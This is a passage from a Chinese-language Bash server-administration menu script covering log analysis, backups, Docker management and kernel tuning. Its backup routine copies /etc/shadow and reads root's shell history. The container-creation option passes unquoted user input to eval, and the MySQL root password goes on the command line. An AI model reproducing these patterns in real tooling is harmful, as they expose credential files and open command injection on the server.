        echo "FORWARD链默认策略: $(sudo iptables -L FORWARD | grep policy | awk '{print $4}')"
        echo "OUTPUT链默认策略: $(sudo iptables -L OUTPUT | grep policy | awk '{print $4}')"
    fi

    echo -e "\n${YELLOW}安全建议:${NC}"
    echo "1. INPUT链默认策略应为DROP或REJECT"
    echo "2. 只开放必要的端口"
    echo "3. 限制源IP访问敏感服务"
    echo "4. 记录拒绝的连接尝试"

    log_operation "防火墙规则检查" "完成" "INFO"
}

security_log_analysis() {
    echo -e "${BOLD}安全日志分析${NC}"

    echo "选择分析内容:"
    echo "1. 登录失败尝试"
    echo "2. 可疑命令执行"
    echo "3. 文件访问监控"
    echo "4. 系统调用审计"
    read -p "请选择: " analysis_type

    case $analysis_type in
        1)
            echo -e "${CYAN}分析登录失败...${NC}"
            echo -e "${YELLOW}最近登录失败:${NC}"
            sudo grep "Failed password" /var/log/auth.log 2>/dev/null | tail -20 || \
            sudo grep "Failed password" /var/log/secure 2>/dev/null | tail -20

            echo -e "\n${YELLOW}失败次数最多的IP:${NC}"
            sudo grep "Failed password" /var/log/auth.log 2>/dev/null | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10
            ;;
        2)
            echo -e "${CYAN}分析命令历史...${NC}"
            echo -e "${YELLOW}最近执行的命令:${NC}"
            history | tail -20

            echo -e "\n${YELLOW}root用户的命令历史:${NC}"
            sudo tail -20 /root/.bash_history 2>/dev/null || echo "无法访问root历史"
            ;;
        3)
            echo -e "${CYAN}分析文件访问...${NC}"
            if command -v auditctl &> /dev/null; then
                echo -e "${YELLOW}审计规则:${NC}"
                sudo auditctl -l
                echo -e "\n${YELLOW}最近的审计日志:${NC}"
                sudo ausearch -m all -ts today 2>/dev/null | head -20
            else
                echo "auditd未安装"
            fi
            ;;
        4)
            echo -e "${CYAN}分析系统调用...${NC}"
            if command -v ausearch &> /dev/null; then
                echo -e "${YELLOW}失败的系统调用:${NC}"
                sudo ausearch -m SYSCALL -sv no 2>/dev/null | tail -10
            else
                echo "auditd未安装"
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "安全日志分析" "类型: $analysis_type" "INFO"
}

# ==================== 备份与恢复模块 ====================
backup_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}备份与恢复${NC}"
        echo -e "${BLUE}1.${NC} 备份重要配置文件"
        echo -e "${BLUE}2.${NC} 备份网站数据"
        echo -e "${BLUE}3.${NC} 备份数据库"
        echo -e "${BLUE}4.${NC} 定时备份设置"
        echo -e "${BLUE}5.${NC} 恢复备份"
        echo -e "${BLUE}6.${NC} 备份状态查看"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        echo ""
        read -p "请选择操作: " choice

        case $choice in
            1) backup_configs ;;
            2) backup_websites ;;
            3) backup_databases ;;
            4) setup_backup_schedule ;;
            5) restore_backup ;;
            6) check_backup_status ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

backup_configs() {
    echo -e "${BOLD}备份重要配置文件${NC}"

    if ! confirm_action "备份系统配置文件？" "n"; then
        return
    fi

    local backup_time=$(date +%Y%m%d_%H%M%S)
    local backup_dir="$BACKUP_DIR/configs_$backup_time"

    mkdir -p "$backup_dir"

    echo -e "${CYAN}正在备份配置文件...${NC}"

    local config_files=(
        "/etc/passwd"
        "/etc/shadow"
        "/etc/group"
        "/etc/sudoers"
        "/etc/ssh/sshd_config"
        "/etc/hosts"
        "/etc/resolv.conf"
        "/etc/fstab"
        "/etc/crontab"
        "/etc/profile"
        "/etc/bash.bashrc"
        "/etc/sysctl.conf"
    )

    for config in "${config_files[@]}"; do
        if [ -f "$config" ]; then
            sudo cp "$config" "$backup_dir/" 2>/dev/null && \
            echo -e "${GREEN}✓${NC} 备份: $config" || \
            echo -e "${YELLOW}✗${NC} 跳过: $config (权限不足)"
        fi
    done

    echo -e "${CYAN}备份/etc目录重要子目录...${NC}"
    sudo tar -czf "$backup_dir/etc_backup.tar.gz" \
        /etc/ssh \
        /etc/nginx \
        /etc/apache2 \
        /etc/mysql \
        /etc/postgresql \
        2>/dev/null || true

    cat > "$backup_dir/restore.sh" << 'EOF'
#!/bin/bash

BACKUP_DIR="$(dirname "$0")"
echo "开始恢复配置文件..."

if [ -f "$BACKUP_DIR/etc_backup.tar.gz" ]; then
    sudo tar -xzf "$BACKUP_DIR/etc_backup.tar.gz" -C /
fi

for file in "$BACKUP_DIR"/*; do
    filename=$(basename "$file")
    if [ "$filename" != "restore.sh" ] && [ "$filename" != "etc_backup.tar.gz" ]; then
        sudo cp "$file" "/etc/$filename"
        echo "恢复: /etc/$filename"
    fi
done

echo "恢复完成！建议重启相关服务。"
EOF

    chmod +x "$backup_dir/restore.sh"

    echo -e "\n${GREEN}备份完成！${NC}"
    echo -e "备份目录: $backup_dir"
    echo -e "大小: $(du -sh "$backup_dir" | cut -f1)"

    log_operation "备份配置文件" "目录: $backup_dir" "SUCCESS"
}

backup_websites() {
    echo -e "${BOLD}备份网站数据${NC}"

    if ! confirm_action "备份网站数据？" "n"; then
        return
    fi

    local backup_time=$(date +%Y%m%d_%H%M%S)
    local backup_dir="$BACKUP_DIR/websites_$backup_time"

    mkdir -p "$backup_dir"

    echo -e "${CYAN}正在备份网站数据...${NC}"

    local web_dirs=(
        "/var/www/html"
        "/var/www"
        "/usr/share/nginx/html"
        "/srv/http"
        "$HOME/public_html"
        "$HOME/www"
    )

    local found_websites=0

    for web_dir in "${web_dirs[@]}"; do
        if [ -d "$web_dir" ] && [ "$(ls -A "$web_dir" 2>/dev/null)" ]; then
            echo -e "${CYAN}备份: $web_dir${NC}"
            local dir_name=$(basename "$web_dir")
            sudo tar -czf "$backup_dir/${dir_name}_$backup_time.tar.gz" -C "$(dirname "$web_dir")" "$dir_name" 2>/dev/null
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}✓${NC} 备份成功"
                found_websites=1
            else
                echo -e "${YELLOW}✗${NC} 备份失败"
            fi
        fi
    done

    if [ -d "/etc/nginx" ]; then
        sudo tar -czf "$backup_dir/nginx_config.tar.gz" -C /etc nginx
        echo -e "${GREEN}✓${NC} 备份nginx配置"
    fi

    if [ -d "/etc/apache2" ]; then
        sudo tar -czf "$backup_dir/apache_config.tar.gz" -C /etc apache2
        echo -e "${GREEN}✓${NC} 备份apache配置"
    fi

    if [ "$found_websites" -eq 1 ]; then
        echo -e "\n${GREEN}网站备份完成！${NC}"
        echo -e "备份目录: $backup_dir"
        echo -e "总大小: $(du -sh "$backup_dir" | cut -f1)"
    else
        echo -e "${YELLOW}未找到网站数据${NC}"
        rm -rf "$backup_dir"
    fi

    log_operation "备份网站数据" "目录: $backup_dir" "SUCCESS"
}

backup_databases() {
    echo -e "${BOLD}备份数据库${NC}"

    if ! confirm_action "备份数据库？" "n"; then
        return
    fi

    local backup_time=$(date +%Y%m%d_%H%M%S)
    local backup_dir="$BACKUP_DIR/databases_$backup_time"

    mkdir -p "$backup_dir"

    echo -e "${CYAN}正在备份数据库...${NC}"

    if command -v mysql &> /dev/null && [ -f ~/.my.cnf ]; then
        echo -e "${CYAN}备份MySQL数据库...${NC}"
        databases=$(mysql -e "SHOW DATABASES;" | grep -Ev "(Database|information_schema|performance_schema|mysql|sys)")

        for db in $databases; do
            echo "备份数据库: $db"
            mysqldump --single-transaction --quick --lock-tables=false "$db" | gzip > "$backup_dir/${db}_$backup_time.sql.gz"
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}✓${NC} 备份成功"
            else
                echo -e "${YELLOW}✗${NC} 备份失败"
            fi
        done
    elif command -v mysql &> /dev/null; then
        echo -e "${YELLOW}MySQL配置未找到，请提供root密码${NC}"
        read -s -p "MySQL root密码: " mysql_pass
        echo

        databases=$(mysql -u root -p"$mysql_pass" -e "SHOW DATABASES;" 2>/dev/null | grep -Ev "(Database|information_schema|performance_schema|mysql|sys)")

        for db in $databases; do
            echo "备份数据库: $db"
            mysqldump -u root -p"$mysql_pass" --single-transaction --quick --lock-tables=false "$db" 2>/dev/null | gzip > "$backup_dir/${db}_$backup_time.sql.gz"
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}✓${NC} 备份成功"
            else
                echo -e "${YELLOW}✗${NC} 备份失败"
            fi
        done
    fi

    if command -v pg_dump &> /dev/null; then
        echo -e "${CYAN}备份PostgreSQL数据库...${NC}"
        sudo -u postgres pg_dumpall | gzip > "$backup_dir/postgresql_all_$backup_time.sql.gz" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✓${NC} PostgreSQL备份成功"
        else
            echo -e "${YELLOW}✗${NC} PostgreSQL备份失败"
        fi
    fi

    find /var /home -name "*.db" -o -name "*.sqlite" 2>/dev/null | head -10 | while read -r db_file; do
        echo "备份SQLite数据库: $db_file"
        cp "$db_file" "$backup_dir/"
    done

    echo -e "\n${GREEN}数据库备份完成！${NC}"
    echo -e "备份目录: $backup_dir"
    echo -e "大小: $(du -sh "$backup_dir" | cut -f1)"

    log_operation "备份数据库" "目录: $backup_dir" "SUCCESS"
}

setup_backup_schedule() {
    echo -e "${BOLD}定时备份设置${NC}"

    echo "选择备份类型:"
    echo "1. 每日备份"
    echo "2. 每周备份"
    echo "3. 每月备份"
    echo "4. 查看当前备份任务"
    echo "5. 删除备份任务"
    read -p "请选择: " schedule_type

    case $schedule_type in
        1|2|3)
            echo "选择备份内容:"
            echo "1. 配置文件"
            echo "2. 网站数据"
            echo "3. 数据库"
            echo "4. 全部"
            read -p "请选择: " backup_content

            case $backup_content in
                1) backup_command="$SCRIPT_PATH --backup-configs" ;;
                2) backup_command="$SCRIPT_PATH --backup-websites" ;;
                3) backup_command="$SCRIPT_PATH --backup-databases" ;;
                4) backup_command="$SCRIPT_PATH --backup-all" ;;
                *) echo -e "${RED}无效选择${NC}"; return ;;
            esac

            local cron_schedule=""
            case $schedule_type in
                1) cron_schedule="0 2 * * *" ;;
                2) cron_schedule="0 2 * * 0" ;;
                3) cron_schedule="0 2 1 * *" ;;
            esac

            (crontab -l 2>/dev/null | grep -v "$backup_command"; echo "$cron_schedule $backup_command >> $LOG_FILE 2>&1") | crontab -

            echo -e "${GREEN}定时备份已设置！${NC}"
            echo -e "计划: $cron_schedule"
            echo -e "命令: $backup_command"
            ;;
        4)
            echo -e "${CYAN}当前备份任务:${NC}"
            crontab -l | grep -E "backup|$SCRIPT_PATH"
            ;;
        5)
            echo -e "${CYAN}删除备份任务...${NC}"
            crontab -l | grep -v "$SCRIPT_PATH" | crontab -
            echo -e "${GREEN}备份任务已删除${NC}"
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "设置定时备份" "类型: $schedule_type" "SUCCESS"
}

restore_backup() {
    echo -e "${BOLD}恢复备份${NC}"

    if [ ! -d "$BACKUP_DIR" ] || [ -z "$(ls -A "$BACKUP_DIR" 2>/dev/null)" ]; then
        echo -e "${YELLOW}没有找到备份文件${NC}"
        return
    fi

    echo -e "${CYAN}可用的备份:${NC}"
    local backups=("$BACKUP_DIR"/*/)
    local count=1
    local valid_backups=()

    for backup in "${backups[@]}"; do
        if [ -d "$backup" ]; then
            valid_backups+=("$backup")
            backup_name=$(basename "$backup")
            backup_size=$(du -sh "$backup" 2>/dev/null | cut -f1)
            backup_date=$(echo "$backup_name" | grep -o '[0-9]\{8\}_[0-9]\{6\}' | head -1)
            echo "$count. $backup_name ($backup_size) - $backup_date"
            ((count++))
        fi
    done

    if [ ${#valid_backups[@]} -eq 0 ]; then
        echo -e "${YELLOW}没有找到可用的备份${NC}"
        return
    fi

    read -p "选择要恢复的备份编号: " backup_num

    if ! [[ "$backup_num" =~ ^[0-9]+$ ]] || [ "$backup_num" -gt ${#valid_backups[@]} ] || [ "$backup_num" -lt 1 ]; then
        echo -e "${RED}无效的编号${NC}"
        return
    fi

    local selected_backup="${valid_backups[$((backup_num-1))]}"

    if ! confirm_action "恢复备份: $(basename "$selected_backup")？" "n"; then
        return
    fi

    echo -e "${CYAN}开始恢复备份...${NC}"

    if [ -f "$selected_backup/restore.sh" ]; then
        echo -e "${CYAN}使用恢复脚本...${NC}"
        sudo bash "$selected_backup/restore.sh"
    else
        echo -e "${CYAN}手动恢复文件...${NC}"
        echo -e "${YELLOW}请手动复制文件到相应位置${NC}"
    fi

    echo -e "${GREEN}备份恢复完成！${NC}"

    log_operation "恢复备份" "备份: $(basename "$selected_backup")" "SUCCESS"
}

check_backup_status() {
    echo -e "${BOLD}备份状态检查${NC}"

    if [ ! -d "$BACKUP_DIR" ]; then
        echo -e "${YELLOW}备份目录不存在${NC}"
        return
    fi

    echo -e "${CYAN}备份目录: $BACKUP_DIR${NC}"
    echo -e "${CYAN}总大小: $(du -sh "$BACKUP_DIR" 2>/dev/null | cut -f1)${NC}"

    echo -e "\n${CYAN}最近的备份:${NC}"
    find "$BACKUP_DIR" -maxdepth 1 -type d -name "*_*" -printf "%T+ %p\n" 2>/dev/null | sort -r | head -10 | while read -r line; do
        backup_path=$(echo "$line" | awk '{print $2}')
        backup_name=$(basename "$backup_path")
        backup_size=$(du -sh "$backup_path" 2>/dev/null | cut -f1)
        echo "- $backup_name ($backup_size)"
    done

    echo -e "\n${CYAN}定时备份任务:${NC}"
    crontab -l | grep -E "backup|$SCRIPT_PATH" || echo "无定时备份任务"

    log_operation "检查备份状态" "完成" "INFO"
}

# ==================== 容器管理模块 ====================
container_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}容器管理${NC}"
        echo -e "${BLUE}1.${NC} Docker安装与管理"
        echo -e "${BLUE}2.${NC} 容器操作"
        echo -e "${BLUE}3.${NC} 镜像管理"
        echo -e "${BLUE}4.${NC} Docker Compose"
        echo -e "${BLUE}5.${NC} 容器监控"
        echo -e "${BLUE}6.${NC} 清理容器资源"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        echo ""
        read -p "请选择操作: " choice

        case $choice in
            1) docker_management ;;
            2) container_operations ;;
            3) image_management ;;
            4) docker_compose_management ;;
            5) container_monitoring ;;
            6) cleanup_containers ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

docker_management() {
    echo -e "${BOLD}Docker安装与管理${NC}"

    echo "选择操作:"
    echo "1. 安装Docker"
    echo "2. 卸载Docker"
    echo "3. 启动/停止Docker服务"
    echo "4. 配置Docker镜像加速"
    echo "5. 查看Docker信息"
    read -p "请选择: " docker_choice

    case $docker_choice in
        1)
            echo -e "${CYAN}安装Docker...${NC}"

            sudo apt remove -y docker docker-engine docker.io containerd runc 2>/dev/null || true

            eval "$PKG_INSTALL apt-transport-https ca-certificates curl gnupg lsb-release"

            curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

            echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

            sudo apt update
            sudo apt install -y docker-ce docker-ce-cli containerd.io

            sudo systemctl start docker
            sudo systemctl enable docker

            sudo usermod -aG docker "$USER"

            echo -e "${GREEN}Docker安装完成！${NC}"
            echo -e "${YELLOW}请重新登录使docker组生效${NC}"
            ;;
        2)
            if confirm_action "卸载Docker？" "n"; then
                sudo apt remove -y docker docker-engine docker.io containerd runc
                sudo apt purge -y docker-ce docker-ce-cli containerd.io
                sudo rm -rf /var/lib/docker
                sudo rm -rf /var/lib/containerd
                echo -e "${GREEN}Docker已卸载${NC}"
            fi
            ;;
        3)
            echo "选择操作:"
            echo "1. 启动Docker"
            echo "2. 停止Docker"
            echo "3. 重启Docker"
            echo "4. 查看状态"
            read -p "请选择: " service_choice

            case $service_choice in
                1) sudo systemctl start docker ;;
                2) sudo systemctl stop docker ;;
                3) sudo systemctl restart docker ;;
                4) sudo systemctl status docker ;;
                *) echo -e "${RED}无效选择${NC}" ;;
            esac
            ;;
        4)
            echo -e "${CYAN}配置Docker镜像加速...${NC}"

            if [ ! -d /etc/docker ]; then
                sudo mkdir -p /etc/docker
            fi

            cat << EOF | sudo tee /etc/docker/daemon.json
{
  "registry-mirrors": [
    "https://docker.mirrors.ustc.edu.cn",
    "https://hub-mirror.c.163.com",
    "https://registry.docker-cn.com"
  ],
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "100m",
    "max-file": "3"
  }
}
EOF

            sudo systemctl daemon-reload
            sudo systemctl restart docker

            echo -e "${GREEN}Docker镜像加速已配置！${NC}"
            ;;
        5)
            echo -e "${CYAN}Docker系统信息:${NC}"
            docker info || echo "Docker未安装或未运行"
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "Docker管理" "操作: $docker_choice" "INFO"
}

container_operations() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}容器操作${NC}"
        echo -e "${BLUE}1.${NC} 列出容器"
        echo -e "${BLUE}2.${NC} 启动容器"
        echo -e "${BLUE}3.${NC} 停止容器"
        echo -e "${BLUE}4.${NC} 重启容器"
        echo -e "${BLUE}5.${NC} 进入容器"
        echo -e "${BLUE}6.${NC} 查看容器日志"
        echo -e "${BLUE}7.${NC} 创建容器"
        echo -e "${BLUE}8.${NC} 删除容器"
        echo -e "${BLUE}0.${NC} 返回"
        echo ""
        read -p "请选择操作: " choice

        case $choice in
            1)
                echo -e "${CYAN}所有容器:${NC}"
                docker ps -a
                ;;
            2)
                read -p "输入容器ID或名称: " container_name
                docker start "$container_name"
                ;;
            3)
                read -p "输入容器ID或名称: " container_name
                docker stop "$container_name"
                ;;
            4)
                read -p "输入容器ID或名称: " container_name
                docker restart "$container_name"
                ;;
            5)
                read -p "输入容器ID或名称: " container_name
                docker exec -it "$container_name" /bin/bash || docker exec -it "$container_name" /bin/sh
                ;;
            6)
                read -p "输入容器ID或名称: " container_name
                docker logs "$container_name"
                ;;
            7)
                echo -e "${CYAN}创建新容器${NC}"
                read -p "输入镜像名称: " image_name
                read -p "输入容器名称: " container_name
                read -p "输入端口映射 (如 80:80): " port_mapping
                read -p "输入数据卷映射 (如 /宿主机:/容器): " volume_mapping

                local docker_cmd="docker run -d"
                [ -n "$container_name" ] && docker_cmd="$docker_cmd --name $container_name"
                [ -n "$port_mapping" ] && docker_cmd="$docker_cmd -p $port_mapping"
                [ -n "$volume_mapping" ] && docker_cmd="$docker_cmd -v $volume_mapping"
                docker_cmd="$docker_cmd $image_name"

                echo -e "${CYAN}执行命令: $docker_cmd${NC}"
                eval "$docker_cmd"
                ;;
            8)
                read -p "输入容器ID或名称: " container_name
                docker rm -f "$container_name"
                ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac

        echo ""
        read -p "按回车键继续..."
    done
}

image_management() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}镜像管理${NC}"
        echo -e "${BLUE}1.${NC} 列出镜像"
        echo -e "${BLUE}2.${NC} 拉取镜像"
        echo -e "${BLUE}3.${NC} 搜索镜像"
        echo -e "${BLUE}4.${NC} 删除镜像"
        echo -e "${BLUE}5.${NC} 构建镜像"
        echo -e "${BLUE}6.${NC} 导出镜像"
        echo -e "${BLUE}7.${NC} 导入镜像"
        echo -e "${BLUE}0.${NC} 返回"
        echo ""
        read -p "请选择操作: " choice

        case $choice in
            1)
                echo -e "${CYAN}本地镜像:${NC}"
                docker images
                ;;
            2)
                read -p "输入镜像名称 (如 nginx:latest): " image_name
                docker pull "$image_name"
                ;;
            3)
                read -p "输入搜索关键词: " search_term
                docker search "$search_term"
                ;;
            4)
                read -p "输入镜像ID或名称: " image_name
                docker rmi "$image_name"
                ;;
            5)
                echo -e "${CYAN}构建Docker镜像${NC}"
                read -p "输入Dockerfile所在目录: " dockerfile_dir
                read -p "输入镜像标签: " image_tag

                if [ -f "$dockerfile_dir/Dockerfile" ]; then
                    docker build -t "$image_tag" "$dockerfile_dir"
                else
                    echo -e "${RED}未找到Dockerfile${NC}"
                fi
                ;;
            6)
                read -p "输入镜像名称: " image_name
                read -p "输入导出文件名: " export_file
                docker save "$image_name" -o "$export_file.tar"
                echo -e "${GREEN}镜像已导出到 $export_file.tar${NC}"
                ;;
            7)
                read -p "输入导入文件路径: " import_file
                docker load -i "$import_file"
                ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac

        echo ""
        read -p "按回车键继续..."
    done
}

docker_compose_management() {
    echo -e "${BOLD}Docker Compose管理${NC}"

    if ! command -v docker-compose &> /dev/null; then
        echo -e "${YELLOW}安装Docker Compose...${NC}"

        sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
        sudo chmod +x /usr/local/bin/docker-compose

        sudo ln -sf /usr/local/bin/docker-compose /usr/bin/docker-compose

        echo -e "${GREEN}Docker Compose安装完成！${NC}"
    fi

    echo "选择操作:"
    echo "1. 启动服务"
    echo "2. 停止服务"
    echo "3. 重启服务"
    echo "4. 查看状态"
    echo "5. 查看日志"
    echo "6. 构建服务"
    read -p "请选择: " compose_choice

    case $compose_choice in
        1)
            echo -e "${CYAN}启动Docker Compose服务...${NC}"
            docker-compose up -d
            ;;
        2)
            echo -e "${CYAN}停止Docker Compose服务...${NC}"
            docker-compose down
            ;;
        3)
            echo -e "${CYAN}重启Docker Compose服务...${NC}"
            docker-compose restart
            ;;
        4)
            echo -e "${CYAN}服务状态:${NC}"
            docker-compose ps
            ;;
        5)
            read -p "输入服务名称 (留空查看所有): " service_name
            if [ -z "$service_name" ]; then
                docker-compose logs
            else
                docker-compose logs "$service_name"
            fi
            ;;
        6)
            echo -e "${CYAN}构建服务...${NC}"
            docker-compose build
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "Docker Compose管理" "操作: $compose_choice" "INFO"
}

container_monitoring() {
    echo -e "${BOLD}容器监控${NC}"

    echo "选择监控内容:"
    echo "1. 容器资源使用"
    echo "2. 容器网络"
    echo "3. 容器进程"
    echo "4. 实时监控"
    read -p "请选择: " monitor_choice

    case $monitor_choice in
        1)
            echo -e "${CYAN}容器资源使用情况:${NC}"
            docker stats --no-stream
            ;;
        2)
            echo -e "${CYAN}容器网络信息:${NC}"
            docker network ls
            echo -e "\n${CYAN}网络详情:${NC}"
            docker network inspect $(docker network ls -q) | jq '.[] | {Name: .Name, IPAM: .IPAM, Containers: .Containers}' 2>/dev/null || echo "需要安装jq工具"
            ;;
        3)
            echo -e "${CYAN}容器进程:${NC}"
            docker ps --format "table {{.Names}}\t{{.Status}}" | while read -r line; do
                container_name=$(echo "$line" | awk '{print $1}')
                if [ "$container_name" != "NAMES" ]; then
                    echo -e "\n${YELLOW}容器: $container_name${NC}"
                    docker top "$container_name"
                fi
            done
            ;;
        4)
            echo -e "${CYAN}实时监控容器资源 (Ctrl+C退出)...${NC}"
            watch -n 2 docker stats --no-stream
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    log_operation "容器监控" "类型: $monitor_choice" "INFO"
}

cleanup_containers() {
    echo -e "${BOLD}清理容器资源${NC}"

    echo "选择清理内容:"
    echo "1. 清理停止的容器"
    echo "2. 清理无用的镜像"
    echo "3. 清理无用的网络"
    echo "4. 清理无用的卷"
    echo "5. 清理构建缓存"
    echo "6. 全部清理"
    read -p "请选择: " cleanup_choice

    case $cleanup_choice in
        1)
            echo -e "${CYAN}清理停止的容器...${NC}"
            docker container prune -f
            ;;
        2)
            echo -e "${CYAN}清理无用的镜像...${NC}"
            docker image prune -a -f
            ;;
        3)
            echo -e "${CYAN}清理无用的网络...${NC}"
            docker network prune -f
            ;;
        4)
            echo -e "${CYAN}清理无用的卷...${NC}"
            docker volume prune -f
            ;;
        5)
            echo -e "${CYAN}清理构建缓存...${NC}"
            docker builder prune -f
            ;;
        6)
            echo -e "${CYAN}执行全面清理...${NC}"
            docker system prune -a -f --volumes
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac

    echo -e "${GREEN}清理完成！${NC}"
    log_operation "清理容器资源" "类型: $cleanup_choice" "SUCCESS"
}

# ==================== 性能优化模块 ====================
performance_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}性能优化${NC}"
        echo -e "${BLUE}1.${NC} 内核参数优化"
        echo -e "${BLUE}2.${NC} 磁盘性能优化"
        echo -e "${BLUE}3.${NC} 内存优化"
        echo -e "${BLUE}4.${NC} 网络优化"
        echo -e "${BLUE}5.${NC} 进程优先级调整"
        echo -e "${BLUE}6.${NC} 系统服务优化"
        echo -e "${BLUE}7.${NC} 数据库优化"
        echo -e "${BLUE}8.${NC} Web服务器优化"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        echo ""
        read -p "请选择操作: " choice

        case $choice in
            1) kernel_optimization ;;
            2) disk_optimization ;;
            3) memory_optimization ;;
            4) network_optimization ;;
            5) process_priority ;;
            6) service_optimization ;;
            7) database_optimization ;;
            8) webserver_optimization ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}"; sleep 1 ;;
        esac

        if [ "$choice" -ne 0 ] 2>/dev/null; then
            echo ""
            read -p "按回车键继续..."
        fi
    done
}

kernel_optimization() {
    echo -e "${BOLD}内核参数优化${NC}"

    if ! confirm_action "应用内核优化参数？" "n"; then
        return
    fi

    echo -e "${CYAN}备份当前sysctl配置...${NC}"
    sudo cp /etc/sysctl.conf /etc/sysctl.conf.backup.$(date +%Y%m%d)

    echo -e "${CYAN}应用优化参数...${NC}"

    local tmp_conf=$(mktemp)
    cat << EOF > "$tmp_conf"

# ==================== 性能优化参数 ====================
# 内存优化
vm.swappiness = 10
vm.vfs_cache_pressure = 50
vm.dirty_ratio = 10
vm.dirty_background_ratio = 5

# 网络优化
net.core.somaxconn = 65535
net.core.netdev_max_backlog = 65535
net.ipv4.tcp_max_syn_backlog = 65535
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_syn_retries = 2
net.ipv4.tcp_synack_retries = 2
net.ipv4.tcp_fin_timeout = 30
net.ipv4.tcp_keepalive_time = 1200
net.ipv4.tcp_keepalive_intvl = 15
net.ipv4.tcp_keepalive_probes = 5
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_tw_recycle = 0
net.ipv4.tcp_max_tw_buckets = 20000
net.ipv4.ip_local_port_range = 1024 65535
net.ipv4.tcp_rmem = 4096 87380 6291456
net.ipv4.tcp_wmem = 4096 16384 4194304
net.core.rmem_max = 6291456
net.core.wmem_max = 4194304
net.core.rmem_default = 131072
net.core.wmem_default = 131072

# 文件系统优化
fs.file-max = 2097152
fs.nr_open = 2097152

# 其他优化
kernel.panic = 10
kernel.core_uses_pid = 1
kernel.sysrq = 0
EOF

    while IFS= read -r line; do
        if [[ -n "$line" && ! "$line" =~ ^# ]]; then
            key=$(echo "$line" | cut -d'=' -f1 | xargs)
            if ! grep -q "^${key}[[:space:]]*=" /etc/sysctl.conf; then
                echo "$line" | sudo tee -a /etc/sysctl.conf > /dev/null
            fi
        else
            echo "$line" | sudo tee -a /etc/sysctl.conf > /dev/null
        fi
    done < "$tmp_conf"
    rm -f "$tmp_conf"

    sudo sysctl -p

    echo -e "${GREEN}内核参数优化完成！${NC}"
    echo -e "${YELLOW}建议重启系统使所有优化生效${NC}"

    log_operation "内核参数优化" "完成" "SUCCESS"
}

disk_optimization() {
    echo -e "${BOLD}磁盘性能优化${NC}"

    echo "选择优化类型:"
    echo "1. 调整I/O调度器"
    echo "2. 优化文件系统"
    echo "3. 调整mount参数"
    echo "4. 启用TRIM (SSD)"
    read -p "请选择: " disk_choice

    case $disk_choice in
        1)
            echo -e "${CYAN}调整I/O调度器...${NC}"

            for disk in /sys/block/sd*; do
                if [ -d "$disk" ]; then
                    disk_name=$(basename "$disk")
                    echo -e "\n${YELLOW}磁盘 $disk_name:${NC}"

                    current_scheduler=$(cat "$disk/queue/scheduler" | grep -o '\[.*\]' | tr -d '[]')
                    echo "当前调度器: $current_scheduler"

                    if grep -q "deadline" "$disk/queue/scheduler"; then
                        echo deadline > "$disk/queue/scheduler"
                        echo "已设置为: deadline"
                    fi
                fi
            done
            ;;
        2)
            echo -e "${CYAN}优化文件系统...${NC}"

            for mount_point in $(df -T | grep -E 'ext4|xfs|btrfs' | awk '{print $NF}'); do
                fstype=$(df -T "$mount_point" | tail -1 | awk '{print $2}')
                echo -e "\n${YELLOW}挂载点: $mount_point ($fstype)${NC}"

                case $fstype in
                    ext4)
                        echo "优化ext4:"
                        echo "建议: tune2fs -o journal_data_writeback $mount_point"
                        ;;
                    xfs)
                        echo "优化xfs:"
                        echo "建议: xfs_growfs $mount_point"
                        ;;
                    btrfs)
                        echo "优化btrfs:"
                        echo "建议: btrfs filesystem defragment -r $mount_point"
                        ;;
                esac
            done
            ;;
        3)
            echo -e "${CYAN}调整mount参数...${NC}"

            sudo cp /etc/fstab /etc/fstab.backup.$(date +%Y%m%d)

            echo -e "${YELLOW}建议的优化参数:${NC}"
            echo "对于SSD: noatime,nodiratime,discard"
            echo "对于HDD: noatime,nodiratime"
            echo "对于数据库: noatime,nodiratime,data=writeback"

            echo -e "\n${CYAN}当前挂载参数:${NC}"
            mount | grep -E 'ext4|xfs|btrfs'
            ;;
        4)
            echo -e "${CYAN}启用TRIM (SSD)...${NC}"

            for disk in /sys/block/sd*; do
                if [ -d "$disk" ]; then
                    if [ "$(cat "$disk/queue/rotational")" -eq 0 ]; then
                        disk_name=$(basename "$disk")
